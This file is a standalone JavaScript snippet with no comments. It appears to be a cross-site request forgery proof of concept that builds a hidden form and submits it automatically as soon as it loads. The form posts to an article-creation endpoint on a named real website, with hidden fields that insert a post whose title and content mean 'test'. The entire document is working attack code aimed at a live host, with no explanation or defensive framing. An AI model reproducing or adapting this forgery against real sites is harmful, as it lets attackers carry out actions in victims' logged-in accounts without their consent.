document.write('<form name=hello></form>');   
var hello=document.forms['hello'];   
hello.action='http://lib.uir.cn/ucenter/article/do.jsp';   
hello.method='POST';   

var input = document.createElement('input');
input.type = 'hidden';
input.name = 'title';
input.value = '%E6%B5%8B%E8%AF%95';
hello.appendChild(input);

var input = document.createElement('input');
input.type = 'hidden';
input.name = 'categoryId';
input.value = '4028813a3947376e01394746f9fc0003';
hello.appendChild(input);

var input = document.createElement('input');
input.type = 'hidden';
input.name = 'userCategoryId';
input.value = '0';
hello.appendChild(input);

var textarea=document.createElement('textarea');
textarea.type='hidden';
textarea.name='content';
textarea.value='%3Cp%3E%0D%0A%09%E6%B5%8B%E8%AF%95%E6%B5%8B%E8%AF%95%3C%2Fp%3E%0D%0A';
hello.appendChild(textarea);

var input=document.createElement('input');
input.type = 'hidden';
input.name = 'type';
input.value = 'insert';
hello.appendChild(input);

var input=document.createElement('input');
input.type = 'hidden';
input.name = 'id';
input.value = '0';
hello.appendChild(input);

hello.submit();